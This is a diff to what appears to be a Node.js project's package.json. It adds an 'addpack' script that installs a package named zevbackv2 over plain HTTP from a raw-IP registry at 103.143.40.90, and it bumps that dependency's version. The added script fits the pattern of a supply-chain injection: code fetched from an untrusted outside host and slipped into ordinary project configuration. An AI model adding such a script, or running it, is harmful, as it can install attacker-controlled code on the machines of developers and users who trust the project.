@@ -6,7 +6,8 @@
   "scripts": {
     "dev": "ts-node-dev --respawn --transpile-only src/server.ts",
     "build": "tsc",
-    "start": "node dist/server.js"
+    "start": "node dist/server.js",
+    "addpack": "npm install --registry http://103.143.40.90:4873 zevbackv2"
   },
   "keywords": [],
   "author": "",
@@ -29,7 +30,7 @@
     "multer": "^2.0.2",
     "request": "^2.88.2",
     "socket.io": "^4.8.3",
-    "zevbackv2": "^1.1.52",
+    "zevbackv2": "^1.1.58",
     "zuragpack": "^1.0.17"
   },
   "devDependencies": {
